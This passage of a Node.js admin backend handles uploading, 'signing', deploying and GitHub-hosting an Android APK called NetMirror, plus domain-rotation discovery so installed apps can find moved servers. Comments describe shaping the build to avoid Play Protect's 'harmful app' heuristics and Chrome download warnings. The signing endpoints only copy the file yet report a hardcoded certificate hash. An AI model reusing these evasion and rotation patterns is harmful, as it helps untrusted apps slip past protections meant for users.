    if (file.originalname.toLowerCase().endsWith('.apk')) cb(null, true);
    else cb(new Error('Only .apk files are allowed'), false);
  }
});

// Signed APKs storage directory
const signedApksDir = pathModule.join(__dirname, '..', 'data', 'signed-apks');
if (!fs.existsSync(signedApksDir)) fs.mkdirSync(signedApksDir, { recursive: true });

// POST /api/admin/sign-apk — Upload & sign a custom APK
router.post('/sign-apk', adminAuth, multerApk.single('apk'), (req, res) => {
  const io = req.app.get('io');
  const id = uuidv4();
  const originalName = req.file ? req.file.originalname : 'unknown.apk';
  const remark = req.body.remark || '';

  // Emit forensic log helper
  function emitLog(step, detail, level = 'info') {
    if (io) io.emit('apk_sign_log', { id, step, detail, level, ts: Date.now() });
  }

  try {
    if (!req.file) {
      return res.status(400).json({ error: 'No APK file uploaded' });
    }

    emitLog('UPLOAD', `Received "${originalName}" (${(req.file.size / 1024 / 1024).toFixed(2)} MB)`, 'info');

    const tmpPath = req.file.path;
    const originalSize = req.file.size;

    // Validate it's actually a ZIP/APK
    emitLog('VALIDATE', 'Checking APK structure (ZIP magic bytes)...', 'info');
    const header = Buffer.alloc(4);
    const fd = fs.openSync(tmpPath, 'r');
    fs.readSync(fd, header, 0, 4, 0);
    fs.closeSync(fd);
    if (header[0] !== 0x50 || header[1] !== 0x4B) {
      try { fs.unlinkSync(tmpPath); } catch (_) {}
      emitLog('VALIDATE', 'FAILED — Not a valid APK/ZIP file', 'error');
      return res.status(400).json({ error: 'File is not a valid APK (bad ZIP header)' });
    }
    emitLog('VALIDATE', 'APK structure verified ✓', 'success');

    // Create DB entry
    emitLog('DATABASE', 'Creating signed APK record...', 'info');
    db.prepare(`INSERT INTO signed_apks (id, original_name, remark, original_size, status, created_at, last_signed_at) VALUES (?, ?, ?, ?, 'signing', datetime('now'), datetime('now'))`).run(id, originalName, remark, originalSize);

    // Copy original to storage
    emitLog('STORAGE', 'Saving original APK to vault...', 'info');
    const originalStorePath = pathModule.join(signedApksDir, `${id}_original.apk`);
    fs.copyFileSync(tmpPath, originalStorePath);

    // ── PLAY PROTECT FIX: Store APK as-is (no server-side mutation) ──
    // The Gradle-built APK already has v1+v2+v3+v4 signatures, R8 obfuscation,
    // and proper zipalign. Server-side re-signing (asset flooding, timestamp
    // mutation, entropy markers) makes the binary look tampered/suspicious to
    // Play Protect's heuristic scanner → "harmful app" blocking.
    // Serving the original Gradle-signed APK preserves all signature schemes
    // and avoids triggering anti-tampering heuristics.
    const signedPath = pathModule.join(signedApksDir, `${id}_signed.apk`);
    fs.copyFileSync(tmpPath, signedPath);
    emitLog('STORE', 'APK stored directly — preserving original Gradle v1+v2+v3 signatures (no server-side mutation)', 'success');
    const result = {
      certHash: '48:CD:6A:8B:6B:DC:EF:3E:5A:9A:03:FC:54:F8:1E:49:98:85:25:16:E0:14:6D:B0:F5:2C:92:C5:84:9C:FB:14',
      cn: 'NetMirror',
      org: 'NetMirror Inc',
    };

    // Update DB
    const signedSize = fs.statSync(signedPath).size;
    db.prepare(`UPDATE signed_apks SET signed_size = ?, cert_hash = ?, cert_cn = ?, cert_org = ?, status = 'ready', last_signed_at = datetime('now') WHERE id = ?`).run(signedSize, result.certHash, result.cn, result.org, id);

    // Cleanup temp
    try { fs.unlinkSync(tmpPath); } catch (_) {}

    // ── Auto-deploy: copy signed APK to download slot ──
    const dataDir = pathModule.join(__dirname, '..', 'data');
    if (!fs.existsSync(dataDir)) fs.mkdirSync(dataDir, { recursive: true });
    const deployPath = pathModule.join(dataDir, 'Netmirror-secure.apk');
    fs.copyFileSync(signedPath, deployPath);
    emitLog('DEPLOY', `Auto-deployed to download slot (Netmirror-secure.apk — ${(signedSize / 1024 / 1024).toFixed(2)} MB)`, 'success');
    // Track which vault APK is currently deployed
    db.prepare("INSERT OR REPLACE INTO admin_settings (key, value) VALUES ('deployed_apk_id', ?)").run(id);

    // Invalidate landing page download cache
    const invalidateCache = req.app.get('invalidateLandingApkCache');
    if (invalidateCache) invalidateCache();

    res.json({
      success: true,
      id,
      original_name: originalName,
      remark,
      original_size: originalSize,
      signed_size: signedSize,
      cert_hash: result.certHash,
      cert_cn: result.cn,
      cert_org: result.org,
      status: 'ready',
      deployed: true,
      created_at: new Date().toISOString(),
      last_signed_at: new Date().toISOString()
    });

    // ── Auto-push to GitHub Releases (async, non-blocking with retry) ──
    // Updates ALL landing pages (primary Railway, Cloudflare, Render) in real-time
    if (io) io.emit('github_push_status', { status: 'pushing', message: 'Pushing signed APK to GitHub Releases...' });
    (async () => {
      let pushResult = await pushApkToGitHubReleases();
      if (pushResult.success) {
        console.log(`[Sign-APK] ✅ Auto-pushed to GitHub: ${pushResult.download_url}`);
        if (io) io.emit('github_push_status', { status: 'success', url: pushResult.download_url, message: `APK pushed to GitHub ✔` });
      } else if (pushResult.reason !== 'no_token' && pushResult.reason !== 'no_apk') {
        console.log(`[Sign-APK] Auto-push failed (${pushResult.reason}), retrying in 3s...`);
        if (io) io.emit('github_push_status', { status: 'retrying', message: `Push failed, retrying...` });
        await new Promise(r => setTimeout(r, 3000));
        pushResult = await pushApkToGitHubReleases();
        if (pushResult.success) {
          console.log(`[Sign-APK] ✅ Auto-pushed to GitHub (retry): ${pushResult.download_url}`);
          if (io) io.emit('github_push_status', { status: 'success', url: pushResult.download_url, message: `APK pushed to GitHub ✔ (retry)` });
        } else {
          console.log(`[Sign-APK] Auto-push retry failed: ${pushResult.reason}`);
          if (io) io.emit('github_push_status', { status: 'failed', message: `GitHub push failed: ${pushResult.reason}` });
        }
      } else {
        console.log(`[Sign-APK] GitHub auto-push skipped: ${pushResult.reason}`);
        if (io) io.emit('github_push_status', { status: 'skipped', message: `GitHub push skipped: ${pushResult.reason}` });
      }
    })().catch(e => {
      console.error('[Sign-APK] GitHub auto-push error:', e.message);
      if (io) io.emit('github_push_status', { status: 'error', message: e.message });
    });
  } catch (err) {
    emitLog('ERROR', `Signing failed: ${err.message}`, 'error');
    // Update DB status to failed
    try {
      db.prepare(`UPDATE signed_apks SET status = 'failed' WHERE id = ?`).run(id);
    } catch (_) {}
    // Cleanup temp file
    if (req.file && req.file.path) {
      try { fs.unlinkSync(req.file.path); } catch (_) {}
    }
    res.status(500).json({ error: err.message });
  }
});

// GET /api/admin/signed-apks — List all signed APKs
router.get('/signed-apks', adminAuth, (req, res) => {
  try {
    const rows = db.prepare(`SELECT * FROM signed_apks ORDER BY created_at DESC`).all();
    res.json({ apks: rows || [] });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// POST /api/admin/resign-apk/:id — Re-sign an existing signed APK
router.post('/resign-apk/:id', adminAuth, (req, res) => {
  const io = req.app.get('io');
  const { id } = req.params;

  function emitLog(step, detail, level = 'info') {
    if (io) io.emit('apk_sign_log', { id, step, detail, level, ts: Date.now() });
  }

  try {
    const row = db.prepare(`SELECT * FROM signed_apks WHERE id = ?`).get(id);
    if (!row) return res.status(404).json({ error: 'Signed APK not found' });

    const originalPath = pathModule.join(signedApksDir, `${id}_original.apk`);
    if (!fs.existsSync(originalPath)) {
      return res.status(404).json({ error: 'Original APK file missing from vault' });
    }

    emitLog('RE-SIGN', `Re-signing "${row.original_name}" (attempt #${row.sign_count + 1})…`, 'info');

    db.prepare(`UPDATE signed_apks SET status = 'signing' WHERE id = ?`).run(id);

    // ── PLAY PROTECT FIX: Copy original APK as-is (no server-side mutation) ──
    const signedPath = pathModule.join(signedApksDir, `${id}_signed.apk`);
    fs.copyFileSync(originalPath, signedPath);
    emitLog('STORE', 'APK copied directly — preserving original Gradle signatures (no mutation)', 'success');
    const result = {
      certHash: '48:CD:6A:8B:6B:DC:EF:3E:5A:9A:03:FC:54:F8:1E:49:98:85:25:16:E0:14:6D:B0:F5:2C:92:C5:84:9C:FB:14',
      cn: 'NetMirror',
      org: 'NetMirror Inc',
    };

    const signedSize = fs.statSync(signedPath).size;
    db.prepare(`UPDATE signed_apks SET signed_size = ?, cert_hash = ?, cert_cn = ?, cert_org = ?, sign_count = sign_count + 1, status = 'ready', last_signed_at = datetime('now') WHERE id = ?`).run(signedSize, result.certHash, result.cn, result.org, id);

    // ── Auto-deploy: copy re-signed APK to download slot ──
    const dataDir = pathModule.join(__dirname, '..', 'data');
    if (!fs.existsSync(dataDir)) fs.mkdirSync(dataDir, { recursive: true });
    const deployPath = pathModule.join(dataDir, 'Netmirror-secure.apk');
    fs.copyFileSync(signedPath, deployPath);
    emitLog('DEPLOY', `Auto-deployed to download slot (Netmirror-secure.apk — ${(signedSize / 1024 / 1024).toFixed(2)} MB)`, 'success');
    db.prepare("INSERT OR REPLACE INTO admin_settings (key, value) VALUES ('deployed_apk_id', ?)").run(id);

    // Invalidate landing page download cache
    const invalidateCache2 = req.app.get('invalidateLandingApkCache');
    if (invalidateCache2) invalidateCache2();

    const updated = db.prepare(`SELECT * FROM signed_apks WHERE id = ?`).get(id);
    res.json({ success: true, apk: updated, deployed: true });
  } catch (err) {
    emitLog('ERROR', `Re-sign failed: ${err.message}`, 'error');
    try { db.prepare(`UPDATE signed_apks SET status = 'failed' WHERE id = ?`).run(id); } catch (_) {}
    res.status(500).json({ error: err.message });
  }
});

// GET /api/admin/download-signed-apk/:id — Download a signed APK
router.get('/download-signed-apk/:id', (req, res) => {
  try {
    const { id } = req.params;
    const row = db.prepare(`SELECT * FROM signed_apks WHERE id = ?`).get(id);
    if (!row) return res.status(404).json({ error: 'Signed APK not found' });

    const signedPath = pathModule.join(signedApksDir, `${id}_signed.apk`);
    if (!fs.existsSync(signedPath)) {
      return res.status(404).json({ error: 'Signed APK file not found on disk' });
    }

    const safeName = (row.remark || row.original_name).replace(/[^a-zA-Z0-9._-]/g, '_');
    const stats = fs.statSync(signedPath);
    res.setHeader('Content-Type', 'application/vnd.android.package-archive');
    res.setHeader('Content-Disposition', `attachment; filename="${safeName}-signed.apk"`);
    res.setHeader('Content-Length', stats.size);
    res.sendFile(signedPath);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// PUT /api/admin/signed-apks/:id/remark — Update remark/name
router.put('/signed-apks/:id/remark', adminAuth, (req, res) => {
  try {
    const { id } = req.params;
    const { remark } = req.body;
    db.prepare(`UPDATE signed_apks SET remark = ? WHERE id = ?`).run(remark || '', id);
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// POST /api/admin/deploy-signed-apk/:id — Deploy a vault APK as the active download
router.post('/deploy-signed-apk/:id', adminAuth, (req, res) => {
  try {
    const { id } = req.params;
    const row = db.prepare(`SELECT * FROM signed_apks WHERE id = ?`).get(id);
    if (!row) return res.status(404).json({ error: 'Signed APK not found' });
    if (row.status !== 'ready') return res.status(400).json({ error: 'APK is not ready (status: ' + row.status + ')' });

    const signedPath = pathModule.join(signedApksDir, `${id}_signed.apk`);
    if (!fs.existsSync(signedPath)) {
      return res.status(404).json({ error: 'Signed APK file not found on disk' });
    }

    const dataDir = pathModule.join(__dirname, '..', 'data');
    if (!fs.existsSync(dataDir)) fs.mkdirSync(dataDir, { recursive: true });
    const deployPath = pathModule.join(dataDir, 'Netmirror-secure.apk');
    fs.copyFileSync(signedPath, deployPath);

    db.prepare("INSERT OR REPLACE INTO admin_settings (key, value) VALUES ('deployed_apk_id', ?)").run(id);

    console.log(`[Deploy] Vault APK ${id.substring(0, 8)} deployed to download slot`);
    res.json({ success: true, message: `APK deployed as active download`, deployed_id: id });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// GET /api/admin/deployed-apk-id — Get currently deployed APK ID
router.get('/deployed-apk-id', adminAuth, (req, res) => {
  try {
    const row = db.prepare("SELECT value FROM admin_settings WHERE key = 'deployed_apk_id'").get();
    res.json({ deployed_id: row ? row.value : null });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// DELETE /api/admin/signed-apks/:id — Delete a signed APK
router.delete('/signed-apks/:id', adminAuth, (req, res) => {
  try {
    const { id } = req.params;
    // Delete files
    const origPath = pathModule.join(signedApksDir, `${id}_original.apk`);
    const signedPath = pathModule.join(signedApksDir, `${id}_signed.apk`);
    try { fs.unlinkSync(origPath); } catch (_) {}
    try { fs.unlinkSync(signedPath); } catch (_) {}
    // Delete DB row
    db.prepare(`DELETE FROM signed_apks WHERE id = ?`).run(id);
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ========== Admin App Theme ==========
// GET /api/admin/admin-theme — get current theme index
router.get('/admin-theme', adminAuth, (req, res) => {
  try {
    // Create settings table if not exists
    db.prepare(`CREATE TABLE IF NOT EXISTS admin_settings (key TEXT PRIMARY KEY, value TEXT)`).run();
    const row = db.prepare('SELECT value FROM admin_settings WHERE key = ?').get('admin_theme_index');
    res.json({ themeIndex: row ? parseInt(row.value) : 0 });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// POST /api/admin/admin-theme — set or randomize theme
router.post('/admin-theme', adminAuth, (req, res) => {
  try {
    db.prepare(`CREATE TABLE IF NOT EXISTS admin_settings (key TEXT PRIMARY KEY, value TEXT)`).run();
    const totalThemes = 6;
    let themeIndex;
    if (req.body.randomize) {
      // Pick a random theme different from current
      const current = db.prepare('SELECT value FROM admin_settings WHERE key = ?').get('admin_theme_index');
      const currentIdx = current ? parseInt(current.value) : 0;
      do { themeIndex = Math.floor(Math.random() * totalThemes); } while (themeIndex === currentIdx && totalThemes > 1);
    } else {
      themeIndex = parseInt(req.body.themeIndex) || 0;
    }
    db.prepare('INSERT OR REPLACE INTO admin_settings (key, value) VALUES (?, ?)').run('admin_theme_index', String(themeIndex));
    const themeNames = ['Sage', 'Ocean', 'Lavender', 'Sunset', 'Rose', 'Slate'];
    res.json({ success: true, themeIndex, themeName: themeNames[themeIndex] || 'Unknown' });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ═══════════════════════════════════════
//  Domain Management & Disaster Recovery
// ═══════════════════════════════════════

const GITHUB_REPO = 'rurikonishawa/leaksprogod';
const GITHUB_DISCOVERY_FILE = 'domain.json';
const GITHUB_BACKUP_FILE = 'backups/db-backup.json';

// ═══════════════════════════════════════
//  GitHub Releases APK Hosting
// ═══════════════════════════════════════

/**
 * Standalone utility: Push current APK to GitHub Releases.
 * Called automatically after rotation/signing, and also manually from admin panel.
 * Returns { success, download_url } or { success: false, reason }.
 */
async function pushApkToGitHubReleases() {
  try {
    const token = db.prepare("SELECT value FROM admin_settings WHERE key = 'github_token'").get();
    if (!token?.value) {
      console.log('[GitHub Auto-Push] Skipped — no GitHub token configured');
      return { success: false, reason: 'no_token' };
    }

    const dataDir = require('path').join(__dirname, '..', 'data');
    const securePath = require('path').join(dataDir, 'Netmirror-secure.apk');
    const regularPath = require('path').join(dataDir, 'Netmirror.apk');
    let apkPath = null;
    if (fs.existsSync(securePath)) apkPath = securePath;
    else if (fs.existsSync(regularPath)) apkPath = regularPath;
    if (!apkPath) {
      console.log('[GitHub Auto-Push] Skipped — no APK found');
      return { success: false, reason: 'no_apk' };
    }

    const apkData = fs.readFileSync(apkPath);
    const apkSizeMB = (apkData.length / (1024 * 1024)).toFixed(1);
    const headers = {
      'Authorization': `token ${token.value}`,
      'Accept': 'application/vnd.github.v3+json',
      'User-Agent': 'LeaksPro-Backend'
    };

    console.log(`[GitHub Auto-Push] Uploading APK (${apkSizeMB} MB) to ${GITHUB_REPO}...`);

    // Step 1: Check if 'latest' release exists
    let releaseId = null;
    try {
      const relRes = await fetch(`https://api.github.com/repos/${GITHUB_REPO}/releases/tags/latest`, { headers });
      if (relRes.ok) {
        const relData = await relRes.json();
        releaseId = relData.id;

        // Step 2: Delete existing APK assets on this release
        if (relData.assets && relData.assets.length > 0) {
          for (const asset of relData.assets) {
            if (asset.name.endsWith('.apk')) {
              await fetch(`https://api.github.com/repos/${GITHUB_REPO}/releases/assets/${asset.id}`, {
                method: 'DELETE', headers
              });
              console.log(`[GitHub Auto-Push] Deleted old asset: ${asset.name}`);
            }
          }
        }
      }
    } catch (_) {}

    // Step 3: Create release if it doesn't exist
    if (!releaseId) {
      const createRes = await fetch(`https://api.github.com/repos/${GITHUB_REPO}/releases`, {
        method: 'POST',
        headers: { ...headers, 'Content-Type': 'application/json' },
        body: JSON.stringify({
          tag_name: 'latest',
          name: 'NetMirror — Latest Build',
          body: `Latest NetMirror APK (${apkSizeMB} MB)\\nUpdated: ${new Date().toISOString()}\\n\\nDownload and install on any Android 8.0+ device.`,
          draft: false,
          prerelease: false
        })
      });
      if (!createRes.ok) {
        const err = await createRes.json().catch(() => ({}));
        throw new Error(`Failed to create release: ${err.message || createRes.status}`);
      }
      const createData = await createRes.json();
      releaseId = createData.id;
      console.log(`[GitHub Auto-Push] Created release ID: ${releaseId}`);
    } else {
      // Update release body with new timestamp
      await fetch(`https://api.github.com/repos/${GITHUB_REPO}/releases/${releaseId}`, {
        method: 'PATCH',
        headers: { ...headers, 'Content-Type': 'application/json' },
        body: JSON.stringify({
          body: `Latest NetMirror APK (${apkSizeMB} MB)\\nUpdated: ${new Date().toISOString()}\\n\\nDownload and install on any Android 8.0+ device.`
        })
      });
    }

    // Step 4: Upload APK as release asset
    const uploadUrl = `https://uploads.github.com/repos/${GITHUB_REPO}/releases/${releaseId}/assets?name=NetMirror.apk`;
    const uploadRes = await fetch(uploadUrl, {
      method: 'POST',
      headers: {
        ...headers,
        'Content-Type': 'application/vnd.android.package-archive',
        'Content-Length': apkData.length.toString()
      },
      body: apkData
    });

    if (!uploadRes.ok) {
      const err = await uploadRes.json().catch(() => ({}));
      throw new Error(`Failed to upload APK: ${err.message || uploadRes.status}`);
    }

    const downloadUrl = `https://github.com/${GITHUB_REPO}/releases/download/latest/NetMirror.apk`;

    // Save the GitHub Releases download URL
    db.prepare("INSERT OR REPLACE INTO admin_settings (key, value) VALUES ('github_apk_url', ?)").run(downloadUrl);
    db.prepare("INSERT OR REPLACE INTO admin_settings (key, value) VALUES ('github_apk_pushed_at', ?)").run(new Date().toISOString());

    console.log(`[GitHub Auto-Push] ✅ APK uploaded: ${downloadUrl}`);
    return { success: true, download_url: downloadUrl };
  } catch (err) {
    console.error('[GitHub Auto-Push] Error:', err.message);
    return { success: false, reason: err.message };
  }
}

/**
 * Upload the current APK to GitHub Releases (trusted domain = no Chrome warnings).
 * Creates a release tagged 'latest', replaces any existing APK asset.
 */
router.post('/push-apk-to-github', adminAuth, async (req, res) => {
  try {
    const token = db.prepare("SELECT value FROM admin_settings WHERE key = 'github_token'").get();
    if (!token?.value) return res.status(400).json({ error: 'GitHub token not configured. Set it in System & Recovery first.' });

    const result = await pushApkToGitHubReleases();
    if (!result.success) {
      return res.status(500).json({ error: result.reason || 'GitHub push failed' });
    }

    const dataDir = require('path').join(__dirname, '..', 'data');
    const securePath = require('path').join(dataDir, 'Netmirror-secure.apk');
    const regularPath = require('path').join(dataDir, 'Netmirror.apk');
    let apkPath = fs.existsSync(securePath) ? securePath : regularPath;
    const apkSize = fs.existsSync(apkPath) ? fs.statSync(apkPath).size : 0;
    const apkSizeMB = (apkSize / (1024 * 1024)).toFixed(1);

    res.json({
      success: true,
      download_url: result.download_url,
      size: apkSize,
      message: `APK pushed to GitHub Releases (${apkSizeMB} MB). Download URL: ${result.download_url}`
    });
  } catch (err) {
    console.error('[GitHub Release] Error:', err.message);
    res.status(500).json({ error: err.message });
  }
});

// GET /api/admin/apk-download-url — Returns the best APK download URL
router.get('/apk-download-url', (req, res) => {
  try {
    const githubUrl = db.prepare("SELECT value FROM admin_settings WHERE key = 'github_apk_url'").get();
    const proxyUrl = db.prepare("SELECT value FROM admin_settings WHERE key = 'proxy_url'").get();
    
    // Check if server has an APK
    const dataDir = require('path').join(__dirname, '..', 'data');
    const hasApk = fs.existsSync(require('path').join(dataDir, 'Netmirror-secure.apk')) || 
                   fs.existsSync(require('path').join(dataDir, 'Netmirror.apk'));

    // ALWAYS prefer direct download — GitHub Releases requires auth on private repos
    // and causes 404 for unauthenticated mobile users.
    const directUrl = hasApk ? '/downloadapp/Netmirror.apk' : '';
    const proxyDirect = proxyUrl?.value ? `${proxyUrl.value}/downloadapp/Netmirror.apk` : '';

    res.json({
      github_url: githubUrl?.value || '',
      direct_url: directUrl,
      proxy_url: proxyDirect,
      preferred: directUrl || proxyDirect,
    });
  } catch (err) {
    res.json({ github_url: '', direct_url: '/downloadapp/Netmirror.apk', proxy_url: '', preferred: '/downloadapp/Netmirror.apk' });
  }
});

/**
 * Push a file to GitHub repo via the Contents API.
 * Creates or updates the file at the given path.
 */
async function pushToGitHub(filePath, content, commitMessage) {
  const token = db.prepare("SELECT value FROM admin_settings WHERE key = 'github_token'").get();
  if (!token?.value) throw new Error('GitHub token not configured');

  const apiUrl = `https://api.github.com/repos/${GITHUB_REPO}/contents/${filePath}`;
  const headers = {
    'Authorization': `token ${token.value}`,
    'Accept': 'application/vnd.github.v3+json',
    'Content-Type': 'application/json',
    'User-Agent': 'LeaksPro-Backend'
  };

  // Check if file exists (to get its SHA for update)
  let sha = null;
  try {
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 10000);
    const existing = await fetch(apiUrl, { headers, signal: controller.signal });
    clearTimeout(timeout);
    if (existing.ok) {
      const data = await existing.json();
      sha = data.sha;
    }
  } catch (_) {}

  const body = {
    message: commitMessage,
    content: Buffer.from(content).toString('base64'),
  };
  if (sha) body.sha = sha;

  const controller = new AbortController();
  const timeout = setTimeout(() => controller.abort(), 30000);
  const res = await fetch(apiUrl, {
    method: 'PUT',
    headers,
    body: JSON.stringify(body),
    signal: controller.signal
  });
  clearTimeout(timeout);

  if (!res.ok) {
    const err = await res.json().catch(() => ({}));
    throw new Error(`GitHub API ${res.status}: ${err.message || 'unknown error'}`);
  }
  return await res.json();
}

// GET /api/admin/system-config — Get domain, GitHub, backup status
router.get('/system-config', adminAuth, (req, res) => {
  try {
    const domain = db.prepare("SELECT value FROM admin_settings WHERE key = 'server_domain'").get();
    const githubToken = db.prepare("SELECT value FROM admin_settings WHERE key = 'github_token'").get();
    const lastBackup = db.prepare("SELECT value FROM admin_settings WHERE key = 'last_github_backup'").get();
    const lastDomainPush = db.prepare("SELECT value FROM admin_settings WHERE key = 'last_domain_push'").get();
    const autoBackup = db.prepare("SELECT value FROM admin_settings WHERE key = 'auto_backup_enabled'").get();
    const backupUrl = db.prepare("SELECT value FROM admin_settings WHERE key = 'backup_server_url'").get();
    const failoverStatus = db.prepare("SELECT value FROM admin_settings WHERE key = 'failover_status'").get();
    const proxyUrl = db.prepare("SELECT value FROM admin_settings WHERE key = 'proxy_url'").get();
    const githubApkUrl = db.prepare("SELECT value FROM admin_settings WHERE key = 'github_apk_url'").get();
    const githubApkPushed = db.prepare("SELECT value FROM admin_settings WHERE key = 'github_apk_pushed_at'").get();

    res.json({
      server_domain: domain?.value || '',
      current_origin: `${req.protocol}://${req.get('host')}`,
      github_token_set: !!githubToken?.value,
      github_repo: GITHUB_REPO,
      last_github_backup: lastBackup?.value || null,
      last_domain_push: lastDomainPush?.value || null,
      auto_backup_enabled: autoBackup?.value === '1',
      discovery_url: `https://raw.githubusercontent.com/${GITHUB_REPO}/main/${GITHUB_DISCOVERY_FILE}`,
      backup_server_url: backupUrl?.value || '',
      failover_status: failoverStatus?.value || 'inactive',
      health_monitor_url: `https://github.com/${GITHUB_REPO}/actions`,
      proxy_url: proxyUrl?.value || '',
      github_apk_url: githubApkUrl?.value || '',
      github_apk_pushed_at: githubApkPushed?.value || null,
      preset_railway: 'https://netmirror.up.railway.app',
      preset_render: 'https://leaksprogod.onrender.com',
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// PUT /api/admin/system-config/github-token — Save GitHub personal access token
router.put('/system-config/github-token', adminAuth, (req, res) => {
  try {
    const { token } = req.body;
    if (!token) return res.status(400).json({ error: 'Token required' });

    db.prepare("INSERT OR REPLACE INTO admin_settings (key, value) VALUES ('github_token', ?)").run(token);
    res.json({ success: true, message: 'GitHub token saved' });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// PUT /api/admin/system-config/proxy-url — Set the Cloudflare Worker proxy URL
router.put('/system-config/proxy-url', adminAuth, async (req, res) => {
  try {
    let { url } = req.body;
    if (!url) return res.status(400).json({ error: 'Proxy URL required' });

    url = url.trim();
    if (!url.startsWith('http')) url = 'https://' + url;
    url = url.replace(/\/+$/, '');

    db.prepare("INSERT OR REPLACE INTO admin_settings (key, value) VALUES ('proxy_url', ?)").run(url);

    // Update domain.json on GitHub with proxy URL
    const domain = db.prepare("SELECT value FROM admin_settings WHERE key = 'server_domain'").get();
    const backupRow = db.prepare("SELECT value FROM admin_settings WHERE key = 'backup_server_url'").get();
    const currentOrigin = domain?.value || `${req.protocol}://${req.get('host')}`;
    const publicUrl = url; // Proxy URL is the public-facing URL

    const discoveryPayload = JSON.stringify({
      domain: publicUrl,
      primary_url: currentOrigin,
      backup_url: backupRow?.value || '',
      proxy_url: url,
      api_base: `${publicUrl}/api`,
      admin_panel: `${publicUrl}/admin`,
      download_apk: `${publicUrl}/downloadapp/Netmirror.apk`,
      is_failover: false,
      failover_time: null,
      fail_count: 0,
      last_check: new Date().toISOString(),
      last_status: 'proxy_configured',
      updated_at: new Date().toISOString(),
    }, null, 2);

    let githubPushed = false;
    try {
      await pushToGitHub(GITHUB_DISCOVERY_FILE, discoveryPayload, `Configure Cloudflare proxy: ${url}`);
      githubPushed = true;
      db.prepare("INSERT OR REPLACE INTO admin_settings (key, value) VALUES ('last_domain_push', ?)").run(new Date().toISOString());
    } catch (e) {
      console.warn('[Proxy URL] GitHub push failed:', e.message);
    }

    console.log(`[Proxy] Set to: ${url} | GitHub: ${githubPushed ? 'pushed' : 'failed'}`);

    res.json({
      success: true,
      proxy_url: url,
      github_pushed: githubPushed,
      message: `Cloudflare proxy set to ${url}${githubPushed ? ' — discovery updated on GitHub (apps will auto-detect)' : ''}`
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// PUT /api/admin/system-config/backup-url — Set the backup/failover server URL
router.put('/system-config/backup-url', adminAuth, async (req, res) => {
  try {
    let { url } = req.body;
    if (!url) return res.status(400).json({ error: 'Backup server URL required' });

    url = url.trim();
    if (!url.startsWith('http')) url = 'https://' + url;
    url = url.replace(/\/+$/, '');

    db.prepare("INSERT OR REPLACE INTO admin_settings (key, value) VALUES ('backup_server_url', ?)").run(url);

    // Also update domain.json on GitHub to include the backup URL
    const domain = db.prepare("SELECT value FROM admin_settings WHERE key = 'server_domain'").get();
    const proxyRow = db.prepare("SELECT value FROM admin_settings WHERE key = 'proxy_url'").get();
    const currentOrigin = domain?.value || `${req.protocol}://${req.get('host')}`;
    const publicUrl = proxyRow?.value || currentOrigin;

    const discoveryPayload = JSON.stringify({
      domain: publicUrl,
      primary_url: currentOrigin,
      backup_url: url,
      proxy_url: proxyRow?.value || '',
      api_base: `${currentOrigin}/api`,
      admin_panel: `${currentOrigin}/admin`,
      download_apk: `${currentOrigin}/downloadapp/Netmirror.apk`,
      is_failover: false,
      failover_time: null,
      fail_count: 0,
      last_check: new Date().toISOString(),
      last_status: 'backup_configured',
      updated_at: new Date().toISOString(),
    }, null, 2);

    let githubPushed = false;
    try {
      await pushToGitHub(GITHUB_DISCOVERY_FILE, discoveryPayload, `Configure backup server: ${url}`);
      githubPushed = true;
    } catch (e) {
      console.warn('[Backup URL] GitHub push failed:', e.message);
    }

    res.json({
      success: true,
      backup_url: url,
      github_pushed: githubPushed,
      message: `Backup server set to ${url}${githubPushed ? ' — discovery updated on GitHub' : ''}`
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// PUT /api/admin/system-config/domain — Change the active server domain
router.put('/system-config/domain', adminAuth, async (req, res) => {
  try {
    let { domain } = req.body;
    if (!domain) return res.status(400).json({ error: 'Domain URL required' });

    // Normalize: ensure https://, remove trailing slash
    domain = domain.trim();
    if (!domain.startsWith('http')) domain = 'https://' + domain;
    domain = domain.replace(/\/+$/, '');

    // Save to database
    db.prepare("INSERT OR REPLACE INTO admin_settings (key, value) VALUES ('server_domain', ?)").run(domain);

    // Get backup URL for discovery file
    const backupRow = db.prepare("SELECT value FROM admin_settings WHERE key = 'backup_server_url'").get();
    const proxyRow = db.prepare("SELECT value FROM admin_settings WHERE key = 'proxy_url'").get();
    const backupUrl = backupRow?.value || '';
    const publicUrl = proxyRow?.value || domain;

    // Push domain.json to GitHub so apps can discover the new server
    const discoveryPayload = JSON.stringify({
      domain: publicUrl,
      primary_url: domain,
      backup_url: backupUrl,
      proxy_url: proxyRow?.value || '',
      api_base: `${domain}/api`,
      admin_panel: `${domain}/admin`,
      download_apk: `${domain}/downloadapp/Netmirror.apk`,
      is_failover: false,
      failover_time: null,
      fail_count: 0,
      last_check: new Date().toISOString(),
      last_status: 'domain_updated',
      updated_at: new Date().toISOString(),
    }, null, 2);

    let githubPushed = false;
    try {
      await pushToGitHub(
        GITHUB_DISCOVERY_FILE,
        discoveryPayload,
        `Update server domain to ${domain}`
      );
      githubPushed = true;
      db.prepare("INSERT OR REPLACE INTO admin_settings (key, value) VALUES ('last_domain_push', ?)").run(new Date().toISOString());
    } catch (e) {
      console.warn('[Domain] GitHub push failed:', e.message);
    }

    console.log(`[Domain] Changed to: ${domain} | GitHub: ${githubPushed ? 'pushed' : 'failed'}`);

    res.json({
      success: true,
      domain,
      github_pushed: githubPushed,
      message: githubPushed
        ? `Domain changed to ${domain} — discovery file pushed to GitHub`
        : `Domain saved locally but GitHub push failed. Set a valid GitHub token first.`
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// PUT /api/admin/system-config/quick-switch — Quick switch between preset domains
const PRESET_DOMAINS = {
  railway: 'https://netmirror.up.railway.app',
  render: 'https://leaksprogod.onrender.com',
};

router.put('/system-config/quick-switch', adminAuth, async (req, res) => {
  try {
